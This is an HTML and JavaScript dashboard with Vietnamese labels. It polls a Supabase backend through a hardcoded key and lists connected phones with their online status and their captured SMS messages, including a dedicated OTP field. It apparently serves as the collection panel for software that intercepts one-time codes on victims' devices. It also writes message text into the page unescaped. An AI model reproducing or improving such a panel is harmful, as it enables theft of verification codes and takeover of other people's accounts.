<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>SMS Device</title>

<style>
body {
  background: #0f172a;
  color: white;
  font-family: Arial;
  padding: 20px;
}

.device {
  background: #1e293b;
  padding: 10px;
  margin: 8px 0;
  border-radius: 8px;
  cursor: pointer;
}

.online { border-left: 5px solid #22c55e; }
.offline { border-left: 5px solid #ef4444; }

.sms {
  margin-top: 10px;
  background: #020617;
  padding: 10px;
  border-radius: 6px;
}
</style>

</head>
<body>

<h2>📱 Thiết bị</h2>
<div id="devices"></div>

<script>
const BASE = "https://zxewnhxxojggatsyukif.supabase.co/rest/v1/";
const KEY = "sb_publishable_AGpmkNidqBHY_dnz_TRJ0g_ZarfbeQi";

let devices = [];
let sms = [];

async function load() {

  // lấy devices
  const d = await fetch(BASE + "devices", {
    headers: {
      "apikey": KEY,
      "Authorization": "Bearer " + KEY
    }
  }).then(res => res.json());

  // lấy sms
  const s = await fetch(BASE + "sms?order=created_at.desc", {
    headers: {
      "apikey": KEY,
      "Authorization": "Bearer " + KEY
    }
  }).then(res => res.json());

  devices = d;
  sms = s;

  render();
}

function render() {
  const container = document.getElementById("devices");
  container.innerHTML = "";

  const now = new Date();

  devices.forEach(d => {

    // sms của máy này
    const list = sms.filter(x => x.device_id === d.id);

    // trạng thái online
    const last = new Date(d.last_seen || d.created_at || 0);
    const isOnline = (now - last) < 60000;

    const div = document.createElement("div");
    div.className = "device " + (isOnline ? "online" : "offline");

    div.innerHTML = `
      <b>${d.device_name}</b><br>
      ${isOnline ? "🟢 Online" : "🔴 Offline"}<br>
      <button onclick="deleteDevice('${d.id}', event)">🗑 Xoá</button>
    `;

    div.onclick = () => showSMS(d.id, div);

    container.appendChild(div);
  });
}

function showSMS(deviceId, element) {

  const list = sms.filter(s => s.device_id === deviceId);

  let html = "<div class='sms'>";

  list.forEach(s => {
    html += `
      📨 ${s.sender}<br>
      🔢 ${s.otp}<br>
      📩 ${s.content}
      <hr>
    `;
  });

  html += "</div>";

  element.querySelectorAll(".sms").forEach(e => e.remove());
  element.insertAdjacentHTML("beforeend", html);
}

function deleteDevice(id, e) {
  e.stopPropagation();

  fetch(BASE + "devices?id=eq." + id, {
    method: "DELETE",
    headers: {
      "apikey": KEY,
      "Authorization": "Bearer " + KEY
    }
  }).then(() => load());
}

load();
setInterval(load, 3000);
</script>

</body>
</html>
